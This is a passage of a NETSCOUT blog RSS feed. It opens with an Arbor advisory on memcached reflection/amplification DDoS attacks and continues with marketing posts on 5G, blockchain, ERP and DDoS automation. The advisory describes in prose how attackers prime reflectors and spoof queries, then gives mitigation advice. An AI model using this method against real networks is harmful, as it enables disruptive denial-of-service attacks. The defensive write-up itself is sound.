<p>We have observed a considerable uptick in memcached reflection/amplification attacks ranging in size from a few hundred mb/sec up to 500gb/sec and larger. The amplified attack traffic is sourced from UDP/11211, with a packet size of 1428 bytes (1442 bytes with layer-2 Ethernet framing included), and no fragmentation (memcached segments large responses at layer-7, as does ntp). The attacker typically ‘primes’ a given set of memcached reflectors/amplifiers with arbitrary-length key/value pairs, and then issues memcached queries for those key/value pairs, spoofing the IP addresses of targeted hosts/networks. Both the priming queries and the attack-stimulus queries can be directed from source ports of the attacker’s choice to UDP/11211 on abusable reflectors/amplifiers, meaning that the attacker has full control of which destination port is targeted on the destination hosts/networks.</p>

<p>It should also be noted that memcached priming queries can also be directed towards TCP/11211 on abusable memcached servers. TCP is not currently considered a high-risk memcached reflection/amplification transport as TCP queries cannot be reliably spoofed.</p>

<p>Arbor’s current assessment is that, as with most other DDoS attack methodologies, memcached DDoS attacks were initially - and for a very brief interval - employed manually by skilled attackers; they have subsequently been weaponized and made available to attackers of all skill levels via so-called ‘booter/stresser’ DDoS-for-hire botnets. The rapid increase in the prevalence of these attacks indicates that this relatively new attack vector was weaponized and broadly leveraged by attackers within a relatively short interval.</p>

<p>Due to the nature of both the memcached service/protocol implementation as well as the prevalence and high bandwidth typically available to memcached reflectors/amplifiers, it is critical that network operators take proactive measures to ensure they are prepared to detect, classify, traceback, and mitigate these attacks, as well as ensure that any memcached installations on their networks and/or networks of their end-customers cannot be exploited as reflectors/amplifiers ----</p>

<p><b>Collateral Impact:</b> The potential collateral impact of memcached reflection/amplification DDoS attacks can be highly significant, as these attacks exhibit high reflection/amplification ratios and leverage server-class reflectors/amplifiers which typically feature high-bandwidth access-links and which reside in Internet Data Centers (IDCs) with high-speed upstream transit links. Outbound memcached reflection/amplification traffic, due to its high volume, can also have a negative impact on networks with populations of abusable memcached servers. memcached can also be leveraged for crossbound reflection/amplification attacks targeting services/servers residing within the same IDCs as the memcached reflectors/amplifiers. ----</p>

<p><b>Mitigating Factors:</b> memcached reflection/amplification DDoS attacks can be successfully mitigated by implementing industry-standard Best Current Practices (BCPs) such as source-address validation/BCP38/BCP84; by leveraging network infrastructure functionality such as flowspec, transit ACLs (tACLs), and selective quality-of-service (QoS) policies; and by utilizing intelligent DDoS mitigation systems (IDMSes) such as Arbor SP/TMS and APS to defend the targets of these attacks, as well as to selectively prevent exploitable reflectors/amplifiers from being abused by attackers. ----</p>

<p><b>Recommended Actions:</b> All relevant network infrastructure, host/application/service, and operational Best Current Practices (BCPs) should be implemented by network operators. In particular, state minimization is highly encouraged as a general operational principle to increase resilience in the face of attack. Situationally-appropriate network access policies should be implemented via transit ACLs (tACLs) on Internet Data Center (IDC) upstream transit links to block unauthorized network traffic destined for UDP/11211 and TCP/11211 from ingressing the IDC.</p>

<p>Network operators should export flow telemetry (e.g., NetFlow, IPFIX, s/Flow, cflowd/jflow, Netstream, et. al.) from their peering/transit/customer aggregation edges and Internet data center (IDC) distribution edges to Arbor SP, which provides the ability to detect, classify, and traceback DDoS attack traffic.</p>

<p>Given that intentional production use of memcached across the public Internet is vanishingly rare, traffic sourced from UDP/11211 may be safely rate-limited at peering/transit/customer aggregation edges by the application of situationally-appropriate QoS policies deployed on edge routers. Alternately, transit ACLs (tACLs) may be deployed at peering edges, customer aggregation edges, and Internet data center (IDC) distribution gateway edges to block network traffic sourced from UDP/11211. In either case, care should be exercised to avoid unnecessary overblocking, and Arbor SP should be utilized in order to determine the efficacy of QoS policies or tACLs implemented at network edges.</p>

<p>Arbor SP/TMS and APS IDMSes may be deployed in a situationally-appropriate manner to mitigate these attacks via multiple DDoS countermeasures, as well as flowspec for both attack mitigation and selective traffic diversion (SP/TMS).</p>

<p>TMSes and/or APSes may be used both to mitigate reflected/amplified DDoS attack traffic as well as to prevent memecached priming queries and attack-stimulation queries from reaching misconfigured - and thus exploitable - memcached servers located in IDC networks and on end-customer premise networks.</p>

<p>As always, network operators are strongly encouraged to implement source address validation/BCP38/BCP84 in order to prevent their networks and the networks of their end-customers from being leveraged in reflection/amplification DDoS attacks. It is also recommended that network operators scan their IDC networks, as well as those of their end-customers, in order to identify abusable memcached installations so that remediation can take place on a timely basis. ----</p>

<p><b>Applicable NETSCOUT Arbor Solutions:</b> Arbor APS, Arbor SP, Arbor TMS. ----</p>

<p>References: <a href="http://memcached.org/">http://memcached.org/</a></p>

<p><a href="https://sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">https://sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches</a></p>

<p><a href="https://github.com/sensepost/go-derper">https://github.com/sensepost/go-derper</a></p>

<p><a href="https://www.anquanke.com/post/id/87233">https://www.anquanke.com/post/id/87233</a></p>

<p><a href="https://www.apnic.net/wp-content/uploads/2017/01/SAVE-Factsheet-01-copy.pdf">https://www.apnic.net/wp-content/uploads/2017/01/SAVE-Factsheet-01-copy.pdf</a></p>

<p><a href="https://tools.ietf.org/html/bcp38">https://tools.ietf.org/html/bcp38</a> <a href="https://tools.ietf.org/html/bcp84">https://tools.ietf.org/html/bcp84</a>&nbsp;</p>

<p>&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Rise%20and%20Fall%20of%20DDoS%20image%201.jpg" length="970708" type="image/jpeg"/>
    <guid isPermaLink="false">89bf9fe7-5571-4bb0-9d81-dda3ab06823d</guid>
    <pubDate>Tue, 27 Feb 2018 11:08:24 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Response to the NTIA Draft Report on DDoS and Botnet Attacks</title>
  <link>http://localhost:7996/blog/response-ntia-draft-report-ddos-and-botnet-attacks</link>
  <description>On Dec. 1, 2016, the Commission on Enhancing National Cybersecurity introduced a set of goals for the new administration, and protecting the nation’s infrastructure and commerce against DDoS and Botnet attacks was high on the list. A Presidential Executive Order from May 2017 re-emphasized this priority, seeing the importance of our connected world and its fragility based on...</description>
  <content:encoded><![CDATA[<p>On Dec. 1, 2016, <a href="https://www.nist.gov/cybercommission">the Commission on Enhancing National Cybersecurity</a> introduced a set of goals for the new administration, and protecting the nation’s infrastructure and commerce against DDoS and Botnet attacks was high on the list. <a href="https://trumpwhitehouse.archives.gov/presidential-actions/presidential-executive-order-strengthening-cybersecurity-federal-networks-critical-infrastructure/">A Presidential Executive Order from May 2017</a> re-emphasized this priority, seeing the importance of our connected world and its fragility based on the growing threat raised by the plethora of vulnerable, consumer focused Internet- connected devices.&nbsp; Attackers from any spot around the globe can use vulnerabilities in these connected devices and across our digital infrastructures, and other vectors, to cause both digital havoc and increasingly catastrophic physical damage across our nation’s critical infrastructure.</p>

<p>The <a href="https://www.ntia.doc.gov/">NTIA</a>, on behalf of the <a href="https://www.dhs.gov/">DHS</a> and <a href="https://www.commerce.gov/">Department of Commerce</a>, issued a draft report in response to the Presidential Executive Order entitled, “<a href="https://www.ntia.doc.gov/report/2018/report-president-enhancing-resilience-internet-and-communications-ecosystem-against">Enhancing the Resilience of the Internet and Communications Ecosystem Against Botnets and Other Automated, Distributed Threats</a>,” and requested comments from the industry on their conclusions:</p>

<ul>
	<li>Automated distributed attacks are a global problem;</li>
</ul>

<ul>
	<li>While effective tools exist, they are not widely used;</li>
	<li>Products should be secured during all stages of their life cycle;</li>
	<li>Improved education and awareness are necessary;</li>
	<li>Current market incentives are misaligned;</li>
	<li>Automated distributed attacks are an ecosystem-wide challenge.</li>
</ul>

<p>NETSCOUT Arbor supports the findings in the report:</p>

<ul>
	<li>Our ATLAS infrastructure (monitoring one-third of Internet traffic) saw increasing number of DDoS attacks in <a href="http://resources.arbornetworks.com/wp-content/uploads/ARBOR_ATLAS_2017Overview_Infographic.pdf">8 of the 10 most attacked countries in 2017</a>. In the United States, NETSCOUT Arbor observed the number of <a href="http://resources.arbornetworks.com/wp-content/uploads/ARBOR_ATLAS_2017Overview_Infographic.pdf">DDoS attacks increase by 23.3 percent.</a></li>
	<li>These attacks were more sophisticated than in years past with an increasing proportion of such attacks involving multiple attack vectors, particularly leveraging HTTPS and DNS.</li>
	<li>Weaponization of the DDoS threat has accelerated; with tool kits readily available to those with little expertise and many organizations were not able to withstand attacks against them. This has resulted in more outages and losses, with 57 percent of enterprise, government and education (EGE) organizations seeing their internet bandwidth saturated due to DDoS attacks, up from 42 percent in the previous year.</li>
	<li>Many organizations may not be prepared to deal with the changing on the DDoS risk, or the current best practices in protecting their organizations, including using application layer protection, internal network hygiene and comprehensive DDoS attack planning and testing.</li>
</ul>

<p>The importance of managing the risk to our infrastructure from DDoS and Botnet escalating threats can run counter to common IT practices today. Risk management and mitigation strategies are often caught in an organizational “no man’s land” between network, application and security groups, resulting in less cohesive and more piecemeal approaches to managing the risks.</p>

<p>NETSCOUT Arbor has worked with the <a href="https://www.cybersecuritycoalition.org/">Coalition for Cybersecurity Policy &amp; Law</a> on the formulation of a DDoS and Botnet technology profile within the NIST Cybersecurity Framework, which lays out a comprehensive set of best practices to managing the risk from modern DDoS attacks. The Cybersecurity Framework is designed to allow individual organizations to determine their own unique risks, tolerances, threats and vulnerabilities, so that they may prioritize their resources to maximize effectiveness. To see the full profile, click <a href="https://pages.arbornetworks.com/rs/082-KNA-087/images/Coalition_Botnet_Comments.pdf">here</a>.</p>
]]></content:encoded>
    <enclosure url="http://localhost:7996/sites/default/files/BotnetPr4ofile1200x480.jpg" length="747717" type="image/jpeg"/>
    <guid isPermaLink="false">99fd631a-4f56-470f-932d-9da1d51b2e16</guid>
    <pubDate>Mon, 26 Feb 2018 12:50:42 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Arabella Hallawell</dc:creator>
    </item>
<item>
  <title>How Big Data Can Improve Network and Application Intelligence with 5G</title>
  <link>http://localhost:7996/blog/how-big-data-can-improve-network-and-application-intelligence-5g</link>
  <description>There is no doubt that data has become the new currency for service providers. However, data lakes are already becoming flooded with so much data that they can be unusable and there is no indication that this trend will slow or stop. As Alan Carlton points out in his article on Big Data and 5G, “The 5G standards community is already planning to support the collection and...</description>
  <content:encoded><![CDATA[<p>There is no doubt that data has become the new currency for service providers. However, data lakes are already becoming flooded with so much data that they can be unusable and there is no indication that this trend will slow or stop. As Alan Carlton points out in his article on <a href="https://www.computerworld.com/article/3198454/internet-of-things/big-data-will-enable-better-network-and-application-intelligence-in-5g.html">Big Data and 5G</a>, “The 5G standards community is already planning to support the collection and transmission of massive amounts of data.”</p>

<p>The challenge, as Carlton points out, is “Big Data, of course, refers to data sets that are so large and complex that traditional database systems cannot handle them. Big Data also encompasses the techniques for data acquisition, storage, processing, analysis, querying and visualization. Basically, the ability to digest vast amounts of unstructured data in an automated fashion to derive useful insights and to drive automated feedback actions.”</p>

<p>“IoT will be a key part of 5G, and how this unstructured data is used will be an important part of that story. Think, billions of sensors sending back all types of data (including video) to the network. The opportunity here is to use this data to improve the operation of the network itself, or to help the key new applications that will emerge in 5G work better,” adds Carlton.</p>

<p>This brings the need for <a href="https://www.netscout.com/solutions/smart-data">Smart Data</a> that is more intelligent, efficient, scalable, and available in near real time. Service providers need Big Data to be accessible, usable, and extensible to a variety of use cases including network orchestration and optimization, business insights, IoT device behavior, user experience, and more.</p>

<p>Whether it's for 5G, <a href="https://www.netscout.com/solutions/service-provider/iot-internet-things">IoT</a>, or existing 3G/4G networks, service providers need Smart Data in their Big Data. Smart Data leads to Smart Analytics.</p>

<p>~ Mike Serrano, Sr. Product Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/big%20data%205g.jpg" length="230659" type="image/jpeg"/>
    <guid isPermaLink="false">398ded73-ed6f-4598-9e5c-b1904bfb68d2</guid>
    <pubDate>Mon, 26 Feb 2018 12:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Blockchain DX is the Best Healthcare Rx</title>
  <link>http://localhost:7996/blog/blockchain-dx-best-healthcare-rx</link>
  <description>Blockchain is turning into a blockbuster technology for the healthcare industry. In a survey of 200 healthcare executives done by IBM, healthcare institutions are investing heavily in Digital Transformation (DX) blockchain pilots, with nine in ten respondents planning to invest by 2018 across various business areas. This technology is expected to have a profound impact on the...</description>
  <content:encoded><![CDATA[<p>Blockchain is turning into a blockbuster technology for the healthcare industry.&nbsp; In a survey of 200 healthcare executives done by IBM, healthcare institutions are investing heavily in <a href="https://www.netscout.com/solutions/digital-transformation">Digital Transformation</a> (DX) blockchain pilots, with nine in ten respondents planning to invest by 2018 across various business areas. This technology is expected to have a profound impact on the patient experience and solving healthcare challenges.</p>

<p>Like most industries, healthcare is drowning in data from electronic medical records, medical research, and more. Blockchain offers a way to safely manage the deluge, as its foundational distributed ledger technology ensures data integrity. In addition, according to a recent article in <a href="https://www.healthdatamanagement.com/news/blockchain-to-pair-with-other-technologies-to-find-healthcare-uses">HealthData Management</a>, blockchain provides an immutable record of digital events securely shared peer-to-peer between different parties. As such, blockchain can help transform healthcare with access to medical history, whether you are a patient or provider.&nbsp; For example, if pharmacists have access to a secure common database of health information, then it will be a lot harder for people to abuse medical prescriptions (Rx) and overdose. The patient and provider benefits don’t stop there.&nbsp; Blockchain can help with accurate diagnoses, improve treatment outcomes, and reduce supply chain inefficiencies like human error. &nbsp;But blockchain also adds complexity to the IT infrastructure, especially when paired with Medical Internet of Things (MIoT), machine learning, and mobile health. Because blockchain is basically a highly distributed database, it makes assuring service delivery more difficult, and companies need clear visibility into healthcare application interdependencies to get ahead of performance problems before they become patient or provider problems.</p>

<p>The blockchain revolution isn’t a matter of “if” — it’s a matter of “ready or not, here it comes.”&nbsp; The disruption is being felt in healthcare as information is securely shared and trusted.&nbsp; A recent <a href="https://www.ibm.com/blogs/blockchain/2017/12/blockchain-good-health-business/">IBM blog</a> noted blockchain makes it possible to collect, store, protect, and share health data and enable its real-time use without violating regulatory requirements. &nbsp;That puts a huge burden on IT teams to deliver on this promise.&nbsp; Application performance degradations or service disruptions are simply not acceptable when a patient’s health is concerned.&nbsp; So, what can the IT organization do to speed problem resolution and fuel innovation?</p>

<p>The IT organization can use Smart Data to prevent and troubleshoot critical issues that could seriously impair healthcare delivery. For example, consider the impact of performance degradation on any one of the following applications:</p>

<ul>
	<li>Electronic Medical Records (EMR)</li>
	<li>Digital Imaging and Communications in Medicine (DICOM),</li>
	<li>Diagnostic systems</li>
	<li>HL7 communications</li>
	<li>Pharmacy and accounting services</li>
</ul>

<p>By measuring actual transactions and understanding service dependencies, wire data is turned into Smart Data to gain actionable insight to ensure the reliable and uninterrupted delivery of crucial healthcare applications. Learn more about NETSCOUT’s healthcare solutions by clicking <a href="https://www.netscout.com/solutions/service-assurance-healthcare">here</a>.</p>

<p>~ Ron Lifton, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/blockchain.jpg" length="546201" type="image/jpeg"/>
    <guid isPermaLink="false">c2c05b50-f645-43db-aacf-3b14acb46b04</guid>
    <pubDate>Fri, 23 Feb 2018 17:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>ERP, IoT, and Cloud Success Depends on Service Performance</title>
  <link>http://localhost:7996/blog/erp-iot-and-cloud-success-depends-service-performance</link>
  <description>Anybody who has ever torn a ligament knows just how important connective tissue is. As it turns out, the same also applies to Digital Transformation (DX). According to a recent article from Information Management, companies are investing in big data, enterprise resource planning (ERP), and Internet of Things (IoT) technology as part of their Digital Transformation strategy. But...</description>
  <content:encoded><![CDATA[<p>Anybody who has ever torn a ligament knows just how important connective tissue is. As it turns out, the same also applies to <a href="https://www.netscout.com/solutions/digital-transformation">Digital Transformation</a> (DX). According to a <a href="https://www.information-management.com/news/big-data-erp-and-iot-key-to-digital-transformation-efforts">recent article</a> from Information Management, companies are investing in big data, enterprise resource planning (ERP), and Internet of Things (IoT) technology as part of their Digital Transformation strategy.&nbsp; But a follow-up survey entitled, “Industrial Internet of Things and Digital Transformation” turns up something interesting: many of the respondents struggled to successfully connect these investments across their disparate IT environments. For example, when the Internet of Things Institute (IoTI) <a href="http://www.ioti.com/industrial-iot-iiot/study-ioterp-integration-key-digital-transformation">took a look</a> at the second survey, it noted that many respondents had trouble getting industrial IoT data into transactional and analytics systems. According to IoTI, “Only 16% of the 200 manufacturing and contracting executives surveyed said they consumed IoT data in ERP systems.”&nbsp;&nbsp;</p>

<p>The problem is twofold. In some cases, companies bring IoT workloads in from the edge to integrate into the ERP system. In other cases, compute and processing is done at the edge and data is then aggregated in the cloud for analysis. Either way, the enterprise benefits from ERP, IoT, and cloud technology when everything works. However, poor service performance can put those benefits at risk. In a digital world where customer success comes down to seconds or a fraction of a second, pervasive visibility and insight to assure service performance can make or break the business.</p>

<p>The issues turned up by these surveys highlight what various IT analysts have long espoused: Enterprises are being driven to transform digitally, yet they face network and <a href="https://www.netscout.com/what-is/application-performance-monitoring">application performance</a> challenges when moving applications like ERP to the cloud and adding IoT edge devices to the infrastructure. Shifting to a proactive approach to Digital Transformation requires pervasive visibility to first understand the way the application works before, during, and after cloud migration; and from there, to get insight across the entire IoT service delivery stack. When this happens, enterprises then reduce business risk and also have the confidence to innovate.</p>

<p>Armed with understanding the complexities and performance of applications in IoT and cloud environments, IT will have the confidence to facilitate change by delivering the services and security that the business expects while controlling costs.&nbsp; Learn more about successful cloud adoption by <a href="https://www.netscout.com/research/esg/cloud-migration">downloading this Cloud Migration Strategies report by ESG</a> (Enterprise Strategy Group).</p>

<p>~ Ron Lifton, Sr Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/data_in_clouds.jpg" length="139272" type="image/jpeg"/>
    <guid isPermaLink="false">417e465c-e333-49d4-891d-110546932182</guid>
    <pubDate>Fri, 23 Feb 2018 14:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Why the Internet of Energy Requires Service Assurance</title>
  <link>http://localhost:7996/blog/why-internet-energy-requires-service-assurance</link>
  <description>Keeping the lights on might sound straightforward, but for energy providers, limiting outages and ensuring a high-quality customer experience is now intertwined with the cloud; software-defined data centers; blockchain and industrial Internet of Things (IoT). As these technologies and accelerators of Digital Transformation (DX) fundamentally reshapes the energy sector, the need...</description>
  <content:encoded><![CDATA[<p>Keeping the lights on might sound straightforward, but for energy providers, limiting outages and ensuring a high-quality customer experience is now intertwined with the cloud; software-defined data centers; blockchain and industrial Internet of Things (IoT).&nbsp; As these technologies and accelerators of <a href="https://www.netscout.com/solutions/digital-transformation">Digital Transformation</a> (DX) fundamentally reshapes the energy sector, the need for rock-solid service performance increases significantly. Simply put, service assurance is required for the “internet of energy.” Here’s why:</p>

<p>The “internet of energy” supports the services we take for granted on a daily basis. Think about it next time you pump gas, use mobile banking, stream a video, travel, or go shopping at the mall or from your computer.&nbsp; The energy value chain is comprised of both physical and digital assets with electricity production, storage, and consumption being reshaped by data analytics, IoT and blockchain. According to <a href="http://www.digitaljournal.com/tech-and-science/technology/digital-transformation-is-reshaping-the-energy-sector/article/497559#ixzz558PM6O8z">Digital Journal</a>, the biggest gains are with the way power plants operate, in terms of cost savings, and the way assets are managed.&nbsp; Real-time analytics and a range of connected devices are helping energy providers redefine the way power plants and assets are monitored, managed, and serviced, by pinpointing areas ripe for improving efficiency and adding value. <a href="https://www.reuters.com/article/us-blockchain-energy/as-energy-markets-evolve-blockchain-powers-up-idUSKBN1EG0V1">Reuters</a> says as the market liberalizes and renewable energy grows, blockchain offers a way to better handle the increasingly complex and decentralized transactions between users, large and small-scale producers, retailers, and even traders and utilities.</p>

<p>Clean energy is becoming intertwined with the digital economy.&nbsp; As cloud computing companies become some of the largest consumers of electricity, they are shifting to alternative sources of energy like solar and wind to power their servers. Apple and Google have reached 100% renewable energy across all its data centers while others like Amazon, Microsoft, and Facebook have committed to powering their cloud platforms with clean energy. &nbsp;&nbsp;</p>

<p>All these changes offer enormous promise, but only if the energy industry can back up its vision with service performance. After all, a smart grid or smart meter is only as smart as the service assurance solution supporting it. Pervasive visibility throughout the IT environment can provide energy companies with the actionable intelligence necessary to proactively triage performance issues and assure service delivery. This means going beyond “data in your face” to pinpoint the root cause of performance problems. Rather, avoiding blind-spots in highly complex hybrid cloud and multi-cloud environments requires Smart Data that is well-structured, contextual, and available in real time to get insights into application and infrastructure performance.</p>

<p>As the energy sector transforms, service assurance must be part of a winning strategy that manages costs, meets compliance requirements, and delivers a flawless customer experience.&nbsp; Learn more about NETSCOUT’s <a href="https://www.netscout.com/solutions/enabling-digital-transformation-utilities-industry">utility industry</a> solutions, and find out how to accelerate Digital Transformation and why Smart Data makes supplying and consuming energy smarter.</p>

<p>~ Ron Lifton, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/utilities.jpg" length="426745" type="image/jpeg"/>
    <guid isPermaLink="false">aceecdb7-d7da-48e2-8c3d-bef68e8bc5e4</guid>
    <pubDate>Thu, 22 Feb 2018 17:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>CIOs and Digital Disruption: The Big Picture</title>
  <link>http://localhost:7996/blog/cios-and-digital-disruption-big-picture</link>
  <description>It’s not a stretch to say that the CIO job is transforming in lockstep with the massive wave of technologies triggering a digital tsunami in the way businesses operate. From the Internet of Things (IoT) to cloud computing, mobile, analytics, and robotics, the new path to success lies in a company’s ability to transform itself into a digital business. As a result, established...</description>
  <content:encoded><![CDATA[<p>It’s not a stretch to say that the CIO job is transforming in lockstep with the massive wave of technologies triggering a digital tsunami in the way businesses operate. From the <a href="https://www.netscout.com/solutions/internet-things-iot-enterprise">Internet of Things</a> (IoT) to cloud computing, mobile, analytics, and robotics, the new path to success lies in a company’s ability to transform itself into a digital business.&nbsp; As a result, established enterprises have realized that information and technology are fundamental success factors rather than a cost center, making the CIO a <em>de-facto</em> business leader.</p>

<p>Figuring out how to effectively lead this change is a fascinating topic, particularly as most CIOs must also manage a substantial landscape of existing services and technologies. A <a href="https://www.cio.com/article/3214148/cio-role/a-strategic-cio-shares-insights-on-key-disruptive-technology-trends.html">&nbsp;recent article</a> on CIO.com highlighted this issue when the author sat down with Joe Bruhin, the former CIO of Constellation Brands, a six-billion-dollar international producer of and marketer of beer, wine, and spirits.&nbsp;As Bruhin noted, “By some estimates, our current trend of exponential growth trajectory suggest that we will be 32 times more advanced in five years and will continue to grow exponentially. This unprecedented growth will affect the way we work, structure our organizations, as well as the size and skills of IT personnel.” He cites four key trends:</p>

<ul>
	<li>Internet of Things (IoT)</li>
	<li>Disruptive technologies</li>
	<li>Robotics and Robotic Process Automation</li>
	<li>IaaS, PaaS, SaaS, and other “as a Service” solutions</li>
</ul>

<p>All of these technologies and services will have a profound effect on the way IT works, and CIOs need to chart a course that smoothly lands their organization in the digital economy without incurring performance issues. That last bullet point—IaaS, PaaS, SaaS, and other ‘as a Service’ solutions—is of particular interest in this regard. As Bruhin says, “Zero-infrastructure organizations are the future. The challenge is how you get your organization from legacy to IaaS – it isn’t easy.”</p>

<p>And IaaS is just one aspect of cloud; companies must also tackle the complex challenge of migrating applications to the cloud. Whether the migration plan is "lift and shift" or refactoring or a combination of both, CIOs must guarantee line-of-business partners that this migration will not imperil business performance. To the contrary, it should support new business models, improve customer experience, and increase operational efficiencies. To make these things happen, a CIO must have a comprehensive service assurance and security assurance strategy. Here, the idea of pervasive visibility takes on a whole new meaning—IT needs a view of not only the data center, but rather the entire infrastructure and service dependencies, both on-premises and in the cloud. Increasingly, this has driven CIOs to explore a data-driven approach, such as NETSCOUT’s <a href="https://www.netscout.com/solutions/business-assurance">Business Assurance</a> solutions based on <a href="https://www.netscout.com/solutions/smart-data">Smart Data</a>. By doing so, they can assure service and application performance before, during, and after migrating to the cloud and deliver the reliability, availability, responsiveness, and flexibility of services critical to achieving targeted business outcomes. Learn more by <a href="https://www.netscout.com/cloud-migration-strategies?ls=gppc-mktg&amp;lsd=corp_cloud_us-cloud_migration-%2Bcloud%20%2Bmigration%20strategy&amp;gclid=EAIaIQobChMImOn9ydH92AIVEMDICh0PIQ_XEAAYAiAAEgIh0fD_BwE">downloading the Cloud Migration Strategies report by ESG</a> (Enterprise Strategy Group).</p>

<p>~Carol Hildebrand, Sr. Strategic Marketing Writer, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/CIO-discussing-cloud-migration.jpg" length="360781" type="image/jpeg"/>
    <guid isPermaLink="false">8d65d13a-5bc9-46fc-824e-c79ba828ea2d</guid>
    <pubDate>Thu, 22 Feb 2018 11:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Intelligent Automation is Needed for DDoS Defense</title>
  <link>http://localhost:7996/blog/intelligent-automation-needed-ddos-defense</link>
  <description>The number of organizations reporting revenue losses as an impact of DDoS attacks almost doubled in 2017, with 10% of enterprises estimating that a successful DDoS attack would cost in excess of $100,000. Read More</description>
  <content:encoded><![CDATA[<p>Distributed Denial of Service attacks (DDoS) are among the most widely utilized attack type targeting service provider and enterprise organizations. As a result, these organizations are increasingly challenged to handle the volume and diversity of attacks.</p>

<p>The 13th annual Worldwide Infrastructure Security Report (WISR), published by NETSCOUT Arbor, has revealed how the threats have proliferated at a time when persistent staffing challenges are stretching internal network and security teams. This latest WISR found that there were 7.5 million DDoS attacks overall, as well as a 30% increase in the number of enterprise organizations that experienced stealthy application layer attacks. Given this threat environment, awareness of DDoS attacks has increased, with 77% of respondents reporting that DDoS is part of either their business or IT risk assessments.</p>

<p>The WISR also uncovered that the number of organizations reporting revenue losses as an impact of DDoS attacks almost doubled in 2017, with 10% of enterprises estimating that a successful DDoS attack would cost in excess of $100,000. The scale and potential impact of the infrastructure security problem is therefore clear and well understood, but organizations face three core challenges in their efforts to fight back against hackers.</p>

<p>First, the sheer volume of attacks, as detailed above, is overwhelming security teams. Second is the dynamic nature of the threat landscape with the style of attacks constantly changing. In fact, a DDoS attack can involve multiple types of attack, quickly changing their targets to exploit weaknesses. Organizations must be agile in their defensive response.</p>

<p>Finally, there simply aren’t enough cybersecurity experts available for organizations to hire. A recent study by ESG research found that 51% of organizations report having a problematic shortage of cybersecurity skills in 2018. This is up from 45% in 2017. ESG found that 41% of cybersecurity professionals say the skills shortage has led to staff spending disproportionate amounts of time dealing with high-priority issues and incident response.</p>

<p>A situation in which the workload is increasing at a rate higher than the workforce is growing is evidently unsustainable so new, automated approaches are required to alleviate the skills shortage. This is especially relevant because some DDoS attacks can last for just 15 seconds, ending with the network down and needing hours to recover.</p>

<p>It’s not effective to have a manual response to a 15-second burst attack, so automation is seen as a critical component of DDoS defense. The fact that automation provides an answer to some of the challenges means that the market has been flooded with vendors claiming to provide automated solutions, but these may not be suitable or capable of the providing the automated threat protection that organizations need. It’s therefore important to carefully assess what a DDoS protection solution offers and what automation means in the marketplace.</p>

<p>The fact that automation provides an answer to some of the challenges means that the market has been flooded with vendors claiming to provide automated solutions, but these may not be suitable or capable of the providing the automated threat protection that organizations need. It’s therefore important to carefully assess what a managed service offers and what automation means in the marketplace.</p>

<p>NETSCOUT Arbor describes three key attributes of automated threat protection:</p>

<ol>
	<li>The first attribute may seem obvious: the automation has to work and stop the attack.&nbsp;</li>
	<li>Automated mitigation on its own is not enough. What’s needed is intelligent automation that can distinguish between legitimate and attack traffic. With blunt mitigation, it is highly likely to cause significant business damage by blocking legitimate traffic. For example, if a retailer was running a coupon offer and an automated system decided to block the most popular traffic as part of its efforts to end the attack, the retailer's special offer would fail, causing substantial wasted expenditure plus reputational damage.</li>
	<li>The third attribute is reporting. The solution should explain what it is doing and allow operators to understand the decisions that are being made. It can’t be a black box; it must be able to be adapted to respond to changing situations and be able to report on them in detail.</li>
</ol>

<p>At the moment, there is a gap between what’s marketed and what is the reality when it comes to threat protection automation. By asking the right questions about automation, you can distinguish between the hype, vaporware, and solutions that truly add value.</p>

<p><em>~Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/AN_COINS_1200x750_ATLAS.jpg" length="74073" type="image/jpeg"/>
    <guid isPermaLink="false">a3cd28ba-452f-4e39-a826-35047e41fc91</guid>
    <pubDate>Wed, 21 Feb 2018 18:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The Digital Economy is Transforming the Retail Landscape</title>
  <link>http://localhost:7996/blog/digital-economy-transforming-retail-landscape</link>
